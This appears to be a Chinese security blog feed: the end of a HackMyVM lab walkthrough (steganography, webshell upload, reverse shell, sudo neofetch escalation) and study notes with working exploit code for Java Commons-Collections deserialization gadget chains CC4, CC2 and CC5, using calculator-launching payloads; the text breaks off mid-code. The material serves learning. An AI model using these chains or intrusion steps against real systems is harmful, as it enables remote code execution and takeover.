<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ stegseek first.jpg</span><br><span class="line">StegSeek 0.6 - https://github.com/RickdeJager/StegSeek</span><br><span class="line"></span><br><span class="line">[i] Found passphrase: &quot;firstgurl1&quot;</span><br><span class="line">[i] Original filename: &quot;secret.txt&quot;.</span><br><span class="line">[i] Extracting to &quot;first.jpg.out&quot;.</span><br><span class="line">the file &quot;first.jpg.out&quot; does already exist. overwrite ? (y/n)</span><br><span class="line">y</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ cat secret.txt</span><br><span class="line">SGkgSSBoYWQgdG8gY2hhbmdlIHRoZSBuYW1lIG9mIHRoZSB0b2RvIGxpc3QgYmVjb3VzZSBkaXJlY3RvcnkgYnVzdGluZyBpcyB0b28gZWFzeSB0aGVlc2UgZGF5cyBhbHNvIEkgZW5jb2RlZCB0aGlzIGluIGJlc2E2NCBiZWNvdXNlIGl0IGlzIGNvb2wgYnR3IHlvdXIgdG9kbyBsaXN0IGlzIDogMmYgNzQgMzAgNjQgMzAgNWYgNmMgMzEgNzMgNzQgNWYgNjYgMzAgNzIgNWYgNjYgMzEgNzIgMzUgNzQgZG8gaXQgcXVpY2sgd2UgYXJlIHZ1bG5hcmFibGUgZG8gdGhlIGZpcnN0IGZpcnN0IA==</span><br></pre></td></tr></table></figure>

<p>secret.txt里面是串base64字符，解密一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ cat secret.txt| base64 -d</span><br><span class="line">Hi I had to change the name of the todo list becouse directory busting is too easy theese days also I encoded this in besa64 becouse it is cool btw your todo list is : 2f 74 30 64 30 5f 6c 31 73 74 5f 66 30 72 5f 66 31 72 35 74 do it quick we are vulnarable do the first first</span><br></pre></td></tr></table></figure>

<p>注意看中间有一串十六机制数字，再解密一下，得到一个目录，访问一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.19.23.png" ></p>
<h4 id="第一个shell"><a href="#第一个shell" class="headerlink" title="第一个shell"></a>第一个shell</h4><p>注意到第二点提到有upload.php，扫一下目录试试</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.19.57.png" ></p>
<p>扫到一个uploads目录和一个upload.php</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.21.33.png" ></p>
<p>可以发现文件上传没有任何过滤，那直接上传一个一句话木马</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.22.48.png" ></p>
<p>蚁剑连接</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.27.44.png" ></p>
<p>接下来我在目录上传一个后门php，kali开启监听，在蚁剑虚拟终端中用php，即可拿到www-data的shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.31.02.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>sudo -l查到有neofetch可以利用，<a class="link"   href="https://gtfobins.github.io/%E5%9C%A8%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E6%9F%A5%E8%AF%A2%E5%88%B0%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F" >https://gtfobins.github.io/在这个网站查询到提权方式<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.39.02.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.38.30.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@first:/tmp$ echo &#x27;exec /bin/sh&#x27; &gt; a.sh</span><br><span class="line">echo &#x27;exec /bin/sh&#x27; &gt; a.sh</span><br><span class="line">www-data@first:/tmp$ ls</span><br><span class="line">ls</span><br><span class="line">a.sh</span><br><span class="line">www-data@first:/tmp$ sudo -u first neofetch --config a.sh</span><br><span class="line">sudo -u first neofetch --config a.sh</span><br><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(first) gid=1000(first) groups=1000(first),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)</span><br></pre></td></tr></table></figure>

<p>成功拿到first到shell</p>
<p>再次sudo -l，发现有个secret，file查看发现是个二进制文件</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.43.22.png" ></p>
<p>下载到本地用ida分析一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.45.15.png" ></p>
<p>学习别的wp指导这里有个栈溢出（这块地方有待学习），输入超过10个字符串就会执行我们的command，<strong>思路就是sudo调用，然后给一个&#x2F;bin&#x2F;bash</strong>就拿到root到权限了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.47.23.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>图片隐写分析，提权命令利用，栈溢出的利用。</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>blog</tag>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>cc4学习笔记</title>
    <url>/2025/02/20/cc4%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><ul>
<li><a class="link"   href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html" >JDK8u65<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4" >openJDK 8u65<i class="fas fa-external-link-alt"></i></a></li>
<li>Maven 3.6.3</li>
<li>Commons-Collections 4.0</li>
</ul>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>这次的CC4 最后没有用到<code>InvokerTransformer</code>，而是<code>InstantiateTransformer</code>，看到他的<code>transform()</code>，之前CC3就接触到这个，后面有个实例化刚好符合类加载 所以这次的终点是<u>InstantiateTransformer#transform</u>，开始倒推</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250223200903.png" ></p>
<p>发现<code>TransformingComparator#compare</code> 里面调用了transform()，而且里面的<code>this.tranformer</code>可以通过构造函数控制值</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250223201028.png" ></p>
<p>再find usage，来到<code>PriorityQueue#siftDownComparable</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250223201433.png" ></p>
<p>就这么一步一步往上找，最后刚好能找到有一个readObject入口，很顺利，链子倒推就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">InstantiateTransformer.transform()</span><br><span class="line">	-&gt; TransformingComparator.compare()</span><br><span class="line">		-&gt; PriorityQueue.siftDownComparable()</span><br><span class="line">			-&gt; PriorityQueue.siftFown()</span><br><span class="line">				-&gt; PriorityQueue.heapify()</span><br><span class="line">					-&gt; PriorityQueue.readObject()</span><br></pre></td></tr></table></figure>

<p>然后这里<code>TransformingComparator.compare()</code>就是public了，直接修改这后面的东西，前面那一段等反序列化自动调用即可</p>
<h4 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h4><p>先结合之前CC3的内容，尝试直接调用transform()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">byte</span>[] calc = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;calc&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        chainedTransformer.transform(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object filedValue)</span> <span class="keyword">throws</span> IllegalAccessException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        filed.set(object,filedValue);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样执行成功弹出计算机，接下来尝试调用compare()</p>
<p>前面的内容不变</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//        chainedTransformer.transform(1);</span></span><br><span class="line">--&gt;</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line">        comparator.compare(<span class="number">1</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>没问题，接下来尝试把<code>comparator</code>包在<code>PriorityQueue</code>里面，然后直接尝试序列化反序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">byte</span>[] calc = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;calc&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(1);</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line"><span class="comment">//        comparator.compare(1,2);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(comparator);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>但是这次执行失败，按理说是没问题的，调试一下，把断点打在heapify()里面</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250223203951.png" ></p>
<p>跟进，发现这个for都进不去</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250223210211.png" ></p>
<p>我们要控制<code>(size &gt;&gt;&gt; 1) - 1</code>运算结果大于等于0，size是2就好，那我们前面多给<code>priorityQueue</code>加两个东西，使得size是2就能进去for循环</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>这次再跟进就能进入for循环了，但是这次发现没有序列化反序列化就会弹计算机了</p>
<p>这次跟进到add里面，发现在add的过程中会跳到compare一次然后调用transform()后面一系列流程，相当于提前走了readObject流程的后半部份，让我联想到CC6里面其中一部份到了put也会自动弹计算机，解决思路就是在add的时候先控制对象里面没有我们要加载的字节码相关内容，add之后再通过反射修改回去</p>
<p>最后poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">byte</span>[] calc = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;calc&#125;);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(1);</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"><span class="comment">//        comparator.compare(1,2);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(comparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections4.comparators.TransformingComparator&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparatorField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        comparatorField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparatorField.set(comparator,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>有了前面三个链子，再看CC4里面的问题，确实简单多了，希望自己写笔记的效率能高点</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250223214425.png" ></p>
<p>画了张小图，如果有错误十分欢迎找我指正🙏</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a class="link"   href="https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8706-CC4%E9%93%BE/" >https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8706-CC4%E9%93%BE/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/1vxyz/p/17473641.html" >https://www.cnblogs.com/1vxyz/p/17473641.html<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>cc2&amp;cc5&amp;cc7学习笔记</title>
    <url>/2025/02/24/cc2&amp;cc5&amp;cc7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>最后几个链子，不算很难，写在一篇文章了，速战速决！</p>
<h3 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><ul>
<li><a class="link"   href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html" >JDK8u65<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4" >openJDK 8u65<i class="fas fa-external-link-alt"></i></a></li>
<li>Maven 3.6.3(其余版本可以先试试，不行再降版本)</li>
<li>Commons-Collections 4.0</li>
</ul>
<h4 id="CC2分析"><a href="#CC2分析" class="headerlink" title="CC2分析"></a>CC2分析</h4><p>这次CC2和CC4有点像，前面部分差不多，中间用回了<code>InvokerTransformer.transform()</code>，最后也还是用<code>TemplatesImpl</code>加载字节码</p>
<p>主要是从原来的<code>chainTransformer.transfrom()-&gt;InstantiateTransformer.transform()-&gt;TrAXFilter()-&gt;TemplatesImpl.newTransformer()</code>这一段直接替换成用<code>InvokerTransformer.transform()</code>触发<code>TemplatesImpl.newTransformer()</code></p>
<p>画了张图和CC4做对比</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250224140643.png" ></p>
<p>那EXP主要就是修改原来的<code>ChainedTransformer</code>，直接用<code>InvokerTransformer</code>结合transform调用反射调用<code>newTransformer()</code>方法</p>
<h4 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h4><p>把原来的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;TemplatesImpl.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>

<p>变成现在的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br></pre></td></tr></table></figure>

<p>最后代码这么写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">byte</span>[] calc = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">    setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;calc&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">    <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">    priorityQueue.add(templates);</span><br><span class="line">    priorityQueue.add(templates);</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">transformingField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">    transformingField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    transformingField.set(transformingComparator, invokerTransformer);</span><br><span class="line"></span><br><span class="line">    serialize(priorityQueue);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>学到后面会发现利用类加载可以不用再写下面这句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure>

<p>因为在反序列化的时候readObject会自动给<code>_tfactory</code>赋值，只有直接调用类加载的时候才需给他赋值</p>
<h3 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h3><h4 id="CC5分析"><a href="#CC5分析" class="headerlink" title="CC5分析"></a>CC5分析</h4><p>直接看yso给的链条，后部分和CC1后部分差不多，从<code>LazyMap.get()</code>直到最后，不同的是这次调用<code>LazyMap.get()</code>的是<code>TiedMapEntry.toString()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250224144459.png" ></p>
<p>里面调用了<code>getValue()</code>-&gt;<code>map.get()</code>，接上了<code>LazyMap.get()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250224144613.png" ></p>
<p>从toString往前找，作者给出的是<code>BadAttributeValueExpException</code>的readObject</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250224144731.png" ></p>
<p>链子大概就是这样，还是很直观的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250224145632.png" ></p>
<h4 id="EXP编写-1"><a href="#EXP编写-1" class="headerlink" title="EXP编写"></a>EXP编写</h4><p>前面部分是和CC1一样的，直接拿过来，这个比较简单，直接给出来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 前面部分都和CC1一样</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decoratedMap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decoratedMap,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// new一个BadAttributeValueExpException对象</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射修改BadAttributeValueExpException里面的val，使他指向TiedMapEntry</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valField.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span 